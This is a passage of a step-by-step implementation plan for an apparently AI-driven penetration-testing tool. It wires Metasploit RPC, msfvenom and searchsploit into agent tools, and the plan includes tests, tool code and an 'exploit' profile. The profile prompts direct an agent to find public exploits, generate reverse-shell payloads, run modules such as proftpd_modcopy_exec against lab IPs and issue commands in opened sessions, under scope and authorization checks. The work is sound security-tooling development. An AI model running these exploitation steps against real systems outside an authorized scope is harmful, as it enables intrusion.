            "module": "exploit/multi/http/proftpd_modcopy_exec",
            "options": {"RHOSTS": "10.10.10.5"},
            "target": "10.10.10.5",
        })

    assert result.get("is_error") is True
    assert "scope" in result["content"][0]["text"].lower()
    # KEY: check_exploit was NEVER called (scope abort came first)
    mod.check_exploit.assert_not_called()


def test_run_successful_exploit_writes_finding(tmp_targets_dir, monkeypatch):
    """When a session opens, a FindingFact must land in the KB."""
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import metasploit_run, _write_pidfile
    from reverser.kb import for_target
    _write_pidfile(os.getpid())

    client, mod = _setup_run_test(monkeypatch, check_code="vulnerable",
                                   exploit_yields_session=True,
                                   sessions={"7": {"type": "meterpreter",
                                                   "target_host": "10.10.10.5"}})
    with patch("reverser.tools.metasploit._make_msfrpc_client", return_value=client):
        _call(metasploit_run, {
            "module": "exploit/multi/http/proftpd_modcopy_exec",
            "options": {"RHOSTS": "10.10.10.5"},
            "target": "10.10.10.5",
        })

    kb = for_target("10.10.10.5")
    findings = kb.get_findings(severity="high")
    assert len(findings) == 1
    f = findings[0]
    assert "proftpd_modcopy_exec" in f.title
    assert "10.10.10.5" in f.title
    assert f.severity == "high"
    assert "session" in f.description.lower()


def test_run_failed_exploit_no_finding(tmp_targets_dir, monkeypatch):
    """If no session opens, no finding is written."""
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import metasploit_run, _write_pidfile
    from reverser.kb import for_target
    _write_pidfile(os.getpid())

    client, mod = _setup_run_test(monkeypatch, check_code="vulnerable",
                                   exploit_yields_session=False,
                                   sessions={})
    with patch("reverser.tools.metasploit._make_msfrpc_client", return_value=client):
        _call(metasploit_run, {
            "module": "exploit/multi/http/proftpd_modcopy_exec",
            "options": {"RHOSTS": "10.10.10.5"},
            "target": "10.10.10.5",
        })

    kb = for_target("10.10.10.5")
    findings = kb.get_findings(severity="high")
    assert len(findings) == 0
```

- [ ] **Step 2: Run tests to verify they fail**

Run:
```
.devenv/state/venv/bin/pytest tests/test_metasploit_operations.py -v
```
Expected: PASS — the implementation from Task 13 already covers both. Total: 14 tests.

If any test fails, the Task 13 implementation has a bug — fix it inline before commit.

- [ ] **Step 3: (No code change needed.)**

- [ ] **Step 4: Re-run to confirm pass**

```
.devenv/state/venv/bin/pytest tests/test_metasploit_operations.py -v
```

- [ ] **Step 5: Commit**

```bash
git -C .worktrees/metasploit-bridge add tests/test_metasploit_operations.py
git -C .worktrees/metasploit-bridge commit -m "test(metasploit): scope-before-check + auto-finding regression tests"
```

---

## Task 15: metasploit_session tool

**Files:**
- Modify: `src/reverser/tools/metasploit.py` (add tool)
- Modify: `tests/test_metasploit_operations.py` (add tests)

Three actions: `list` (no session_id), `cmd` (session_id + command), `close` (session_id). Single command per `cmd` call — captured up to `timeout_seconds`, then returned (marked partial if timeout).

- [ ] **Step 1: Write the failing tests**

Append to `tests/test_metasploit_operations.py`:

```python
# ── metasploit_session ──────────────────────────────────────────────


def test_session_list(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import metasploit_session, _write_pidfile
    _write_pidfile(os.getpid())

    fake_client = MagicMock()
    fake_client.sessions.list = {
        "1": {"type": "meterpreter", "target_host": "10.10.10.5"},
        "2": {"type": "shell", "target_host": "10.10.10.6"},
    }
    with patch("reverser.tools.metasploit._make_msfrpc_client",
               return_value=fake_client):
        result = _call(metasploit_session, {"action": "list"})

    text = result["content"][0]["text"]
    assert "1" in text and "meterpreter" in text
    assert "2" in text and "shell" in text


def test_session_cmd_captures_output(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import metasploit_session, _write_pidfile
    _write_pidfile(os.getpid())

    fake_session = MagicMock()
    fake_session.run_with_output.return_value = "root\n"
    fake_client = MagicMock()
    fake_client.sessions.session.return_value = fake_session
    fake_client.sessions.list = {"1": {"type": "shell", "target_host": "10.10.10.5"}}
    with patch("reverser.tools.metasploit._make_msfrpc_client",
               return_value=fake_client):
        result = _call(metasploit_session, {
            "action": "cmd",
            "session_id": 1,
            "command": "whoami",
        })

    text = result["content"][0]["text"]
    assert "root" in text


def test_session_cmd_timeout_marked_partial(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import metasploit_session, _write_pidfile
    _write_pidfile(os.getpid())

    fake_session = MagicMock()
    # Simulate timeout: run_with_output raises a TimeoutError (or generic exc)
    fake_session.run_with_output.side_effect = TimeoutError("timed out")
    fake_client = MagicMock()
    fake_client.sessions.session.return_value = fake_session
    fake_client.sessions.list = {"1": {"type": "shell", "target_host": "10.10.10.5"}}
    with patch("reverser.tools.metasploit._make_msfrpc_client",
               return_value=fake_client):
        result = _call(metasploit_session, {
            "action": "cmd",
            "session_id": 1,
            "command": "sleep 1000",
            "timeout_seconds": 5,
        })

    text = result["content"][0]["text"]
    assert "partial" in text.lower() or "timeout" in text.lower()


def test_session_close(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import metasploit_session, _write_pidfile
    _write_pidfile(os.getpid())

    fake_session = MagicMock()
    fake_client = MagicMock()
    fake_client.sessions.session.return_value = fake_session
    fake_client.sessions.list = {"1": {"type": "shell", "target_host": "10.10.10.5"}}
    with patch("reverser.tools.metasploit._make_msfrpc_client",
               return_value=fake_client):
        result = _call(metasploit_session, {
            "action": "close",
            "session_id": 1,
        })

    text = result["content"][0]["text"]
    assert "closed" in text.lower()
    fake_session.stop.assert_called()


def test_session_cmd_requires_session_id(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import metasploit_session, _write_pidfile
    _write_pidfile(os.getpid())
    result = _call(metasploit_session, {"action": "cmd", "command": "whoami"})
    assert result.get("is_error") is True
    assert "session_id" in result["content"][0]["text"].lower()


def test_session_cmd_requires_command(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import metasploit_session, _write_pidfile
    _write_pidfile(os.getpid())
    result = _call(metasploit_session, {"action": "cmd", "session_id": 1})
    assert result.get("is_error") is True
    assert "command" in result["content"][0]["text"].lower()


def test_session_unknown_session(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import metasploit_session, _write_pidfile
    _write_pidfile(os.getpid())

    fake_client = MagicMock()
    fake_client.sessions.list = {}
    with patch("reverser.tools.metasploit._make_msfrpc_client",
               return_value=fake_client):
        result = _call(metasploit_session, {
            "action": "cmd",
            "session_id": 999,
            "command": "whoami",
        })

    text = result["content"][0]["text"]
    assert "not_found" in text.lower() or "not found" in text.lower()
```

- [ ] **Step 2: Run tests to verify they fail**

Run:
```
.devenv/state/venv/bin/pytest tests/test_metasploit_operations.py -v
```
Expected: FAIL — `metasploit_session` not yet defined.

- [ ] **Step 3: Write the implementation**

Append to `src/reverser/tools/metasploit.py`:

```python
@tool(
    "metasploit_session",
    "Interact with a Metasploit session opened by metasploit_run. Actions: "
    "list (enumerate), cmd (single command, captured up to timeout_seconds), "
    "close (kill session). Single command per cmd call — no interactive REPL. "
    "Sessions die when metasploit_stop runs.",
    {
        "type": "object",
        "properties": {
            "action": {"type": "string", "enum": ["list", "cmd", "close"]},
            "session_id": {"type": "integer",
                           "description": "Required for cmd/close"},
            "command": {"type": "string",
                        "description": "Required for cmd"},
            "timeout_seconds": {"type": "integer", "default": 30,
                                "description": "Max time to wait for cmd output"},
        },
        "required": ["action"],
    },
)
async def metasploit_session(args: dict) -> dict:
    try:
        require_pentest_auth()
    except AuthorizationError as e:
        return format_error(str(e))

    err = _require_daemon_running()
    if err:
        return err

    action = args["action"]
    session_id = args.get("session_id")
    command = args.get("command") or ""
    timeout = int(args.get("timeout_seconds", 30))

    try:
        auth = _read_or_create_auth()
        client = _make_msfrpc_client(auth)
    except Exception as e:
        return format_error(f"failed to connect to msfrpcd: "
                            f"{type(e).__name__}: {e}")

    if action == "list":
        try:
            sessions = client.sessions.list or {}
        except Exception as e:
            return format_error(f"sessions.list failed: {e}")
        if not sessions:
            return format_tool_result("No open sessions.")
        lines = [f"Open sessions ({len(sessions)}):"]
        for sid, info in sessions.items():
            i = info or {}
            lines.append(
                f"  [{sid}] type={i.get('type','?')}  "
                f"target_host={i.get('target_host','?')}  "
                f"opened_at={i.get('opened_at','?')}"
            )
        return format_tool_result("\n".join(lines))

    # cmd / close need session_id
    if session_id is None:
        return format_error("action=cmd|close requires session_id argument.")

    sid_key = str(session_id)
    sessions = client.sessions.list or {}
    if sid_key not in sessions:
        return format_tool_result(
            f"Session {session_id} not found.\n  status: not_found"
        )

    try:
        session = client.sessions.session(sid_key)
    except Exception as e:
        return format_error(f"failed to get session {session_id}: "
                            f"{type(e).__name__}: {e}")

    if action == "cmd":
        if not command:
            return format_error("action=cmd requires command argument.")
        try:
            output = session.run_with_output(command, timeout=timeout)
            return format_tool_result(
                f"Session {session_id} output (cmd={command!r}):\n"
                f"  status: open\n"
                f"---\n{output}"
            )
        except TimeoutError as e:
            return format_tool_result(
                f"Session {session_id} cmd={command!r}: TIMEOUT after {timeout}s\n"
                f"  status: open (output partial; re-invoke to wait longer)\n"
                f"  error:  {e}"
            )
        except Exception as e:
            return format_error(
                f"session.run_with_output failed: {type(e).__name__}: {e}"
            )

    if action == "close":
        try:
            session.stop()
        except Exception as e:
            return format_error(f"session.stop failed: {type(e).__name__}: {e}")
        return format_tool_result(
            f"Session {session_id} closed.\n  status: closed"
        )

    return format_error(f"Unknown action: {action!r}. Valid: list, cmd, close")


TOOLS.append(metasploit_session)
```

- [ ] **Step 4: Run tests to verify they pass**

Run:
```
.devenv/state/venv/bin/pytest tests/test_metasploit_operations.py -v
```
Expected: PASS — 21 tests total (5 search + 6 run-matrix + 3 scope/finding + 7 session).

- [ ] **Step 5: Commit**

```bash
git -C .worktrees/metasploit-bridge add src/reverser/tools/metasploit.py tests/test_metasploit_operations.py
git -C .worktrees/metasploit-bridge commit -m "feat(metasploit): metasploit_session list/cmd/close"
```

---

## Task 16: Register operational tools in registry

**Files:**
- Modify: `tests/test_tool_registry.py`

ALL_TOOLS goes 74 → 77 with search/run/session auto-registered. Update the count assertion + visibility tests.

- [ ] **Step 1: Write the failing tests**

Modify `tests/test_tool_registry.py`:

Replace:
```python
    assert len(ALL_TOOLS) == 74, (
        f"expected 74 registered tools, got {len(ALL_TOOLS)}"
    )
    unique_names = {t.name for t in ALL_TOOLS}
    assert len(unique_names) == 72, (
        f"expected 72 unique tools (with 2 pre-existing dups), got {len(unique_names)}"
    )
```

with:
```python
    assert len(ALL_TOOLS) == 77, (
        f"expected 77 registered tools, got {len(ALL_TOOLS)}"
    )
    unique_names = {t.name for t in ALL_TOOLS}
    assert len(unique_names) == 75, (
        f"expected 75 unique tools (with 2 pre-existing dups), got {len(unique_names)}"
    )
```

Add at bottom:

```python
def test_metasploit_operational_tools_registered():
    names = {t.name for t in ALL_TOOLS}
    assert "metasploit_search" in names
    assert "metasploit_run" in names
    assert "metasploit_session" in names


def test_all_eight_metasploit_bridge_tools_registered():
    names = {t.name for t in ALL_TOOLS}
    for name in ("searchsploit_search", "msfvenom_generate",
                 "metasploit_start", "metasploit_stop", "metasploit_status",
                 "metasploit_search", "metasploit_run", "metasploit_session"):
        assert name in names, f"missing tool: {name}"
```

- [ ] **Step 2: Run tests to verify they fail**

Run:
```
.devenv/state/venv/bin/pytest tests/test_tool_registry.py -v
```
Expected: After Task 15 ran, ALL_TOOLS has 77 entries. The old "74" assertion fails. Apply Step 1.

- [ ] **Step 3: Apply the patch from Step 1**

- [ ] **Step 4: Run tests to verify they pass**

Run:
```
.devenv/state/venv/bin/pytest tests/test_tool_registry.py -v
```
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git -C .worktrees/metasploit-bridge add tests/test_tool_registry.py
git -C .worktrees/metasploit-bridge commit -m "test(registry): assert all 8 metasploit-bridge tools (ALL_TOOLS 74→77)"
```

---

## Task 17: Exploit profile + skills

**Files:**
- Create: `src/reverser/profiles/exploit.py`
- Modify: `src/reverser/profiles/__init__.py` (import for side-effect)
- Create: `tests/test_profiles_exploit.py`

New dispatchable specialty. 6 skills with keys h/g/t/i/r/w per spec §7.

- [ ] **Step 1: Write the failing tests**

Create `tests/test_profiles_exploit.py`:

```python
"""Regression tests for the exploit profile registration."""

from reverser.profiles import PROFILES, get_profile, list_profiles


def test_exploit_profile_registered():
    assert "exploit" in PROFILES
    p = get_profile("exploit")
    assert p.name == "Exploit"


def test_exploit_profile_has_six_skills():
    p = get_profile("exploit")
    assert len(p.skills) == 6
    expected_keys = {"h", "g", "t", "i", "r", "w"}
    actual_keys = {s.key for s in p.skills}
    assert actual_keys == expected_keys


def test_exploit_profile_skill_names_unique():
    p = get_profile("exploit")
    names = [s.name for s in p.skills]
    assert len(names) == len(set(names)), f"duplicate skill names: {names}"


def test_exploit_profile_in_list_profiles():
    keys = {p.key for p in list_profiles()}
    assert "exploit" in keys


def test_exploit_prompt_mentions_metasploit_tools():
    p = get_profile("exploit")
    addendum = p.system_addendum
    for token in (
        "searchsploit_search", "msfvenom_generate",
        "metasploit_search", "metasploit_run", "metasploit_session",
        "metasploit_start",
    ):
        assert token in addendum, f"system_addendum missing token: {token}"


def test_exploit_prompt_mentions_scope_and_check_first():
    p = get_profile("exploit")
    addendum = p.system_addendum.lower()
    assert "scope" in addendum
    assert "check" in addendum  # check-then-exploit discipline


def test_exploit_profile_no_tools_allowlist():
    """Specialty profiles get the full tool surface (manager handles allowlist)."""
    p = get_profile("exploit")
    assert p.tools_allowlist is None
```

- [ ] **Step 2: Run tests to verify they fail**

Run:
```
.devenv/state/venv/bin/pytest tests/test_profiles_exploit.py -v
```
Expected: FAIL — exploit profile not registered.

- [ ] **Step 3: Write the implementation**

Create `src/reverser/profiles/exploit.py`:

```python
"""Exploit profile — public-exploit hunter using searchsploit + msfvenom + Metasploit RPC."""

from . import _register, Profile, Skill


SKILL_HUNT = Skill(
    name="Hunt exploits",
    key="h",
    description="searchsploit_search + metasploit_search; cross-reference and rank candidates",
    prompt=(
        "Hunt for public exploits matching the target's software/CVE profile. "
        "Step 1: read the KB (kb_show, kb_list_services) for software/version hints. "
        "Step 2: searchsploit_search with each promising CVE/keyword (set target= so "
        "results land as a KB note). Reject candidates older than 5 years unless the "
        "target software is also old. "
        "Step 3: metasploit_search 'cve:<id>' or 'name:<software>' for each viable hit, "
        "filtered by platform and rank>=good. "
        "Step 4: for each strong candidate, kb_add_hypothesis with the CVE/module name "
        "and a confidence score. The top 3 hypotheses are what the Try Exploit skill "
        "will work through."
    ),
)

SKILL_GENERATE_PAYLOAD = Skill(
    name="Generate payload",
    key="g",
    description="msfvenom_generate with sensible defaults",
    prompt=(
        "Generate a payload for a confirmed-or-likely-exploitable target. Default to "
        "windows/x64/meterpreter/reverse_tcp on Windows, linux/x64/shell_reverse_tcp on "
        "Linux. LHOST should be the operator's outbound interface (ask the user if "
        "unknown). LPORT defaults to 4444. The payload binary lands at "
        "targets/<target>/loot/payloads/<name>-<sha8>.<ext> and is auto-recorded as an "
        "ArtifactFact."
    ),
)

SKILL_TRY_EXPLOIT = Skill(
    name="Try exploit",
    key="t",
    description="metasploit_run on the highest-confidence unconfirmed hypothesis",
    prompt=(
        "Pick the highest-confidence unconfirmed exploit hypothesis (kb_list_hypotheses "
        "status=proposed). Read the rationale carefully. Call metasploit_run with the "
        "module and a minimal options dict (RHOSTS, RPORT). The tool ALWAYS checks first "
        "by default — if check=safe or unknown, that's a strong signal to move to the "
        "next candidate, NOT to set force=true. force=true is only justified when the "
        "module lacks a check method AND the version/CVE evidence is strong. After the "
        "run completes, kb_update_hypothesis with the outcome (confirmed/refuted/inconclusive)."
    ),
)

SKILL_HANDLE_SESSION = Skill(
    name="Handle session",
    key="i",
    description="Characterize a freshly-opened foothold via metasploit_session",
    prompt=(
        "A session just opened. Characterize the foothold: metasploit_session "
        "action=list to confirm the session id, then action=cmd with one command at a "
        "time — start with 'whoami' / 'id', then 'hostname' / 'ipconfig' / 'ifconfig', "
        "then 'uname -a' on Linux or 'systeminfo' on Windows. Record key output as "
        "evidence_refs on the confirming hypothesis. Do NOT chain commands; the tool is "
        "single-shot. Do NOT attempt privilege escalation here — return control to the "
        "lead with a confirmed-foothold finding."
    ),
)

SKILL_REPORT = Skill(
    name="Report",
    key="r",
    description="kb_export_report with confirmed exploits + payload artifacts",
    prompt=(
        "Generate the engagement report scoped to exploit work. kb_export_report writes "
        "targets/<target>/report.md including confirmed-exploit findings (severity=high) "
        "and payload artifacts. Read the file back; confirm the exploit-related findings "
        "are accurately recorded."
    ),
)

SKILL_WRAP_UP = Skill(
    name="Wrap up",
    key="w",
    description="Mark unresolved hypotheses abandoned; final report; tell user /done",
    prompt=(
        "Engagement is ending. For every exploit hypothesis still in proposed/testing "
        "status: kb_update_hypothesis status=abandoned with a one-line reason. Generate "
        "the final report (kb_export_report). Then tell the user: 'Type /done to mark "
        "this session completed and exit.'"
    ),
)


SYSTEM_ADDENDUM = """\

## Profile: Exploit (public-exploit specialist)

You are an exploit-hunting specialist. Find public exploits for software/CVEs the
target is running, generate payloads as needed, attempt exploitation through
Metasploit. Report back to the engagement lead.

### Workflow

1. Read the per-target KB (`kb_show`) for hosts/services/findings/notes.
2. Gather CVE/software hints from KB or dispatch context.
3. `searchsploit_search` for each hint. Reject candidates older than 5 years
   unless target software is also that old.
4. `metasploit_search` for matching modules. Filter by platform + rank
   (excellent > great > good > normal > average).
5. For each candidate worth trying, `kb_add_hypothesis` with the CVE/module.
6. Pick the highest-confidence hypothesis. `metasploit_run` with default
   check-then-exploit. Update the hypothesis with outcome.
7. On session opened: characterize foothold via `metasploit_session` action=cmd.
   Record as evidence_refs.
8. On session NOT opened: mark hypothesis refuted, move to next candidate.
9. After 3 failed attempts: stop, summarize, report back.

### Hard rules

- Always check first (`metasploit_run` default behavior). Override (force=true)
  only when check method is missing AND you have high confidence.
- Honor `scope.toml`. `metasploit_run` enforces it at the tool layer too —
  out-of-scope targets fail BEFORE the check fires.
- Don't run modules with rank=manual or rank=low without explicit user approval.
- Generated payloads land in `targets/<target>/loot/payloads/`. Never write
  payloads anywhere else.
- Don't `metasploit_start` unless you actually need RPC — searchsploit alone
  doesn't need the daemon (msfrpcd is heavy: ~500 MB RAM, ~30s startup).
- Don't crack hashes inside the tool. Surface them via `kb_add_finding` and tell
  the lead.

### Tool reference

- `searchsploit_search(query, ...)` — local exploit-db search
- `msfvenom_generate(payload, lhost, lport, format, target, ...)` — payload generation
- `metasploit_start(target)` — boot the shared daemon + activate per-target workspace
- `metasploit_stop(force=False)` — shut down (warns on open sessions)
- `metasploit_status()` — daemon + auth + workspaces + sessions probe
- `metasploit_search(query, type, platform, rank, limit)` — MSF module search
- `metasploit_run(module, options, target, payload, payload_options, force, timeout_seconds)`
- `metasploit_session(action, session_id, command, timeout_seconds)` — list/cmd/close

### CRITICAL RULES

- This is authorized penetration testing. The user has confirmed via
  `.reverser-authorized` or `REVERSER_PENTEST_AUTHORIZED=1`.
- Do NOT exploit anything you can't tie to a hypothesis with a falsifiable outcome.
- Do NOT chain exploitation past initial foothold — return control to the lead.
- Do NOT skip check-then-exploit just because the rank looks good.
"""


PROFILE_EXPLOIT = _register(Profile(
    name="Exploit",
    key="exploit",
    description="Public-exploit hunter: searchsploit + msfvenom + Metasploit RPC bridge",
    system_addendum=SYSTEM_ADDENDUM,
    skills=[
        SKILL_HUNT,
        SKILL_GENERATE_PAYLOAD,
        SKILL_TRY_EXPLOIT,
        SKILL_HANDLE_SESSION,
        SKILL_REPORT,
        SKILL_WRAP_UP,
    ],
    tools_allowlist=None,
))
```

Modify `src/reverser/profiles/__init__.py` — add `exploit` to the side-effect imports at the bottom:

```python
# ── Profile module imports (each registers itself on import) ────────
from . import (  # noqa: F401, E402  # imported for side effects
    general,
    linux,
    windows,
    android,
    chrome,
    managed,
    api,
    pentest,
    webpentest,
    webapi,
    webrecon,
    ad,
    ctf,
    manager,
    exploit,
)
```

- [ ] **Step 4: Run tests to verify they pass**

Run:
```
.devenv/state/venv/bin/pytest tests/test_profiles_exploit.py -v
```
Expected: PASS — 7 tests.

- [ ] **Step 5: Commit**

```bash
git -C .worktrees/metasploit-bridge add src/reverser/profiles/exploit.py src/reverser/profiles/__init__.py tests/test_profiles_exploit.py
git -C .worktrees/metasploit-bridge commit -m "feat(profiles): exploit specialty with 6 skills"
```

---

## Task 18: Dispatch integration + manager profile blurb

**Files:**
- Modify: `src/reverser/tools/dispatch.py` (`_DISPATCHABLE_SPECIALTIES`)
- Modify: `src/reverser/profiles/manager.py` (system_addendum specialist menu)
- Modify: `tests/test_dispatch.py` and/or `tests/test_profiles_manager.py` (add assertions)

Make the manager profile aware that `exploit` is a dispatchable specialty.

- [ ] **Step 1: Write the failing tests**

Append to `tests/test_dispatch.py` (or a new test file `tests/test_dispatch_exploit.py` if you prefer):

```python
def test_exploit_in_dispatchable_specialties():
    from reverser.tools.dispatch import _DISPATCHABLE_SPECIALTIES
    assert "exploit" in _DISPATCHABLE_SPECIALTIES


def test_dispatchable_specialties_count_after_exploit():
    from reverser.tools.dispatch import _DISPATCHABLE_SPECIALTIES
    assert len(_DISPATCHABLE_SPECIALTIES) == 6
```

Append to `tests/test_profiles_manager.py`:

```python
def test_manager_system_addendum_mentions_exploit_specialty():
    from reverser.profiles import get_profile
    p = get_profile("manager")
    addendum = p.system_addendum
    assert "exploit" in addendum.lower()
    # Verify the menu entry exists in proper form
    assert "`exploit`" in addendum or "**exploit**" in addendum.lower()
```

- [ ] **Step 2: Run tests to verify they fail**

Run:
```
.devenv/state/venv/bin/pytest tests/test_dispatch.py tests/test_profiles_manager.py -v
```
Expected: FAIL — `exploit` not in dispatchable specialties; manager addendum doesn't mention exploit.

- [ ] **Step 3: Write the implementation**

Modify `src/reverser/tools/dispatch.py` — find:
```python
_DISPATCHABLE_SPECIALTIES = ("pentest", "ad", "webpentest", "webapi", "webrecon")
```

and replace with:
```python
_DISPATCHABLE_SPECIALTIES = (
    "pentest", "ad", "webpentest", "webapi", "webrecon",
    "exploit",
)
```

Modify `src/reverser/profiles/manager.py` — find the specialist-menu paragraph that ends:
```
- **`ad`** — Active Directory: assumed-breach methodology, kerberos abuse
  (ASREP-roast, kerberoasting), BloodHound collection and query, lateral
  movement. Dispatch when you've confirmed AD presence (DC, domain joined
  hosts) and want to test domain-relevant hypotheses.
```

and after it add a new bullet:
```
- **`exploit`** — public-exploit hunter: searchsploit + msfvenom + Metasploit
  RPC. Dispatch when you have a CVE-or-software-version hypothesis to test
  (e.g. "CVE-2022-XXXX is exploitable on this host"). The specialist runs the
  search → pick → check-then-exploit → session loop and reports back with
  confirmed/refuted outcome.
```

Also update the line "You may dispatch any of these five specialties":
- old: `You may dispatch any of these five specialties via \`dispatch_specialist\`:`
- new: `You may dispatch any of these six specialties via \`dispatch_specialist\`:`

- [ ] **Step 4: Run tests to verify they pass**

Run:
```
.devenv/state/venv/bin/pytest tests/test_dispatch.py tests/test_profiles_manager.py -v
```
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git -C .worktrees/metasploit-bridge add src/reverser/tools/dispatch.py src/reverser/profiles/manager.py tests/test_dispatch.py tests/test_profiles_manager.py
git -C .worktrees/metasploit-bridge commit -m "feat(dispatch): add exploit to specialist pool (5→6 specialties)"
```

---

## Task 19: devenv.nix — metasploit-framework, exploitdb, pymetasploit3

**Files:**
- Modify: `devenv.nix`

Add the three new dependencies per D2 / spec §11.

- [ ] **Step 1: Verify nixpkgs has the expected packages**

Run (informational, not an automated test):
```
nix-instantiate --eval -E '(import <nixpkgs> {}).metasploit-framework.meta.broken' 2>/dev/null || true
nix-instantiate --eval -E '(import <nixpkgs> {}).exploitdb.meta.broken' 2>/dev/null || true
```
Expected: both return `false` or empty (not broken).

- [ ] **Step 2: Modify `devenv.nix`**

In the cross-platform packages section (under `packages = with pkgs; [`), add the two MSF packages. Find the existing block that includes `neo4j` and add nearby:

```nix
    # Exploit-db + Metasploit bridge (Top 5 #1)
    metasploit-framework      # msfconsole, msfrpcd, msfvenom
    exploitdb                 # searchsploit CLI + the exploit database
```

In the `languages.python.venv.requirements` block, add:

```
        pymetasploit3    # JSON-RPC client to msfrpcd (used by metasploit_* tools)
```

- [ ] **Step 3: Verify the change manually**

Run:
```
grep -E "metasploit-framework|exploitdb|pymetasploit3" devenv.nix
```
Expected: three matches.

- [ ] **Step 4: (Optional) Rebuild the venv to confirm pymetasploit3 installs**

If `devenv shell` is available in this terminal, exit and re-enter. Otherwise rely on the harness operator to validate post-merge.

```
python -c "import pymetasploit3; print(pymetasploit3.__name__)"
```

If pymetasploit3 doesn't import here, that's fine — the test suite mocks it everywhere. Just note this in the commit message.

- [ ] **Step 5: Commit**

```bash
git -C .worktrees/metasploit-bridge add devenv.nix
git -C .worktrees/metasploit-bridge commit -m "chore(devenv): add metasploit-framework, exploitdb, pymetasploit3"
```

---

## Task 20: README + CAPABILITY_ROADMAP updates

**Files:**
- Modify: `CAPABILITY_ROADMAP.md`
- Modify: `README.md`

Mark Top 5 #1 ✅ shipped; add the exploit profile to the README profiles table.

- [ ] **Step 1: Update `CAPABILITY_ROADMAP.md`**

Find:
```
- [ ] **1. (was #2) — Metasploit + msfvenom + searchsploit bridge.** Wraps
  msfconsole RPC (db_nmap → search → check → exploit), msfvenom payload
  generation, and searchsploit + automated CVE → PoC → adapt → run loop.
  Closes the "find a known exploit and try it" gap that's currently entirely
  manual. Highest single-item ROI left; same shape and ~size as the AD pack.
```

Replace with:
```
- [x] **1. (was #2) — Metasploit + msfvenom + searchsploit bridge.**
  - **Status (2026-05-11):** Shipped. 8 MCP tools: `searchsploit_search`,
    `msfvenom_generate`, `metasploit_{start,stop,status,search,run,session}`.
    Shared msfrpcd daemon + per-target MSF workspace; auth at
    `<targets_root>/.shared/msfrpc/auth.json` (0600); `metasploit_run`
    always-check-first with `force=True` escape hatch; scope.toml enforced
    BEFORE check fires; auto-finding written on successful exploit. New
    `exploit` profile joins the manager dispatch pool (5 → 6 specialties).
    Specs/plans: `2026-05-11-metasploit-bridge-design.md`,
    `2026-05-11-metasploit-bridge.md`.
```

Also update the "Network Exploitation & Post-Exploitation" section. Find:
```
- [ ] Metasploit / msfconsole integration (db_nmap → search → check → exploit)
- [ ] msfvenom payload generation
- [ ] searchsploit + automated CVE → PoC fetch → adapt → run loop
```

Replace with:
```
- [x] Metasploit / msfconsole integration (db_nmap → search → check → exploit)
  - **Status (2026-05-11):** Shipped as `metasploit_*` tools. RPC-based; shared daemon + per-target workspace.
- [x] msfvenom payload generation
  - **Status (2026-05-11):** Shipped as `msfvenom_generate` tool.
- [x] searchsploit + automated CVE → PoC fetch → adapt → run loop
  - **Status (2026-05-11):** Shipped as `searchsploit_search` + exploit profile.
```

Also bump the "As of 2026-05-11" line at the top:
```
**As of 2026-05-11:** 15 profiles registered, 77 MCP tools (75 unique), Claude
+ Ollama + LM Studio backends, per-target SQLite KB, session stop/resume,
manager profile (sub-agent coordination), exploit profile + msfrpc bridge,
~490 passing tests.
```

And update the trailing "Remaining work order" line:
```
> **Remaining work order:** #3 → #5 (items #1, #2, #4 already complete).
```

- [ ] **Step 2: Update `README.md`**

Find the profiles table (search for "exploit profile" or the existing AD row). Add a row:

```
| `exploit` | Public-exploit hunter using searchsploit + msfvenom + Metasploit RPC |
```

If the table format is different in your README, mirror the existing row style. If there's a usage example for the AD profile, add an exploit equivalent:

```
# Exploit hunting against a known target
REVERSER_PENTEST_AUTHORIZED=1 reverser i -p exploit 10.10.10.5

# Or dispatched from the manager profile
REVERSER_PENTEST_AUTHORIZED=1 reverser i -p manager 10.10.10.5
# In the TUI: kickoff → manager dispatches exploit specialist with CVE hypotheses
```

- [ ] **Step 3: Verify**

Run:
```
grep "exploit" README.md | head -5
grep "metasploit" CAPABILITY_ROADMAP.md | head -5
```
Expected: both files mention exploit/metasploit prominently.

- [ ] **Step 4: (No tests to run — doc-only changes)**

- [ ] **Step 5: Commit**

```bash
git -C .worktrees/metasploit-bridge add CAPABILITY_ROADMAP.md README.md
git -C .worktrees/metasploit-bridge commit -m "docs: mark Top 5 #1 (Metasploit bridge) shipped"
```

---

## Task 21: Manual smoke test document

**Files:**
- Create: `tests/manual/exploit_smoke.md`

30-minute walkthrough against an HTB box known to be exploitable via a public CVE. Out-of-suite (not run by pytest); intended for the operator after merge.

- [ ] **Step 1: Create the smoke-test doc**

Create `tests/manual/exploit_smoke.md`:

```markdown
# Manual smoke test — Metasploit bridge

**Goal:** End-to-end verify the 8 metasploit-bridge tools against a real HTB box
known to be exploitable via a public CVE. Out-of-suite; ~30 minutes.

**Prereqs:**
- `devenv shell` active; `msfrpcd`, `searchsploit`, `msfvenom` on PATH
- VPN connected to HTB (or other authorized lab)
- `.reverser-authorized` file present (or `REVERSER_PENTEST_AUTHORIZED=1`)
- A target IP with a known-vulnerable service (e.g. ProFTPd 1.3.5
  mod_copy on an old HTB Linux box)

---

## Walkthrough

### 1. Start the daemon

```
reverser i -p exploit 10.10.10.5
```

In the TUI input box:
```
metasploit_start(target="10.10.10.5")
```

Expected response: `status: started`, pid populated, workspace activated.

Confirm: `ls targets/.shared/msfrpc/` shows `auth.json` (mode 0600) and `pidfile`.

### 2. searchsploit query

```
